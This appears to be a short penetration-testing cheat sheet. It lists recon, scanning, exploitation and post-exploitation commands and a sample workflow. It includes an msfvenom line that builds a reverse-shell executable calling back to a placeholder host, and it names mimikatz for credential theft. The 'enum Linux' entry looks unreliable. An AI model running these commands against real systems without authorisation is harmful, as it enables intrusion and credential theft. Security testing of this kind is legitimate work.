## 🔗 Essential Tools

### Recon
```bash
nmap -sn 192.168.1.0/24          # Discovery
subfinder -d target             # Subdomains
amass enum -d target             # Deep enum
httpx -domains targets.txt      # Probe
```

### Scanning
```bash
nmap -sV -sC -p- target          # Full scan
masscan -p1-65535 target        # Fast
nikto -h target                 # Web scan
```

### Exploitation
```bash
msfconsole                      # Metasploit
searchsploit vuln               # Find exploits
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
```

### Post-Exploitation
```bash
enum Linux                      # Linux enum
winPEAS.exe                     # Windows enum
mimikatz                        # Credentials
```

## 📝 Notes

- Update tools: `apt update && apt upgrade`
- Add custom tools to: `/opt/`
- Keep wordlists in: `/usr/share/wordlists/`
- Custom scripts: `~/.local/bin/`

## 🎯 Workflow Example

```bash
# 1. Recon
subfinder -d target.com -o subs.txt

# 2. Scan  
nmap -iL subs.txt -sV -o scan.txt

# 3. Exploit
msfconsole -q -x "use exploit/windows/smb/..."

# 4. Post
enum Linux
mimikatz
```
